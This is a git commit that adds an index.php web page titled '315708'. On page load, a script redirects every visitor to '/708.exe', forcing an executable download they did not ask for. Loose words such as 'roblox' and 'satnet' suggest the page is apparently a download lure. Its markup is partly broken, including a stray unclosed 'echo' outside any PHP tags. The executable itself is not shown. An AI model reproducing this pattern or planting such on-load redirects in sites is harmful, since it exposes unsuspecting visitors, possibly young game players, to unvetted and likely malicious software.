9104d87c1dff50e5070b461eba3705d933c657f1
Miamb <37736785+Miamb@users.noreply.github.com>
2018-03-24 06:39:19 -0700

    new

---
+++ index.php
@@ -0,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>315708</title>
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+<style>
+body {
+  margin:0px auto;}
+#ss {
+  width:700px;
+  margin-left:auto; margin-right:auto; margin-top:10px;
+  border:solid 1px;
+  }
+  #dd {
+    margin:15px;
+    }
+</style>
+</head>
+<body style="background: url(/bg.png);">
+    <script>
+        window.location="/708.exe";
+    </script>
+echo "
+<div id="ss"><div id="dd">
+315708
+</div></div>
+<div style="width:670px; padding-left:15px; padding-right:15px;">die</div>
+</br></br></br><b>extendet</b></br></br>
+
+roblox</br></br>
+
+satnet
+</body>
+</html>
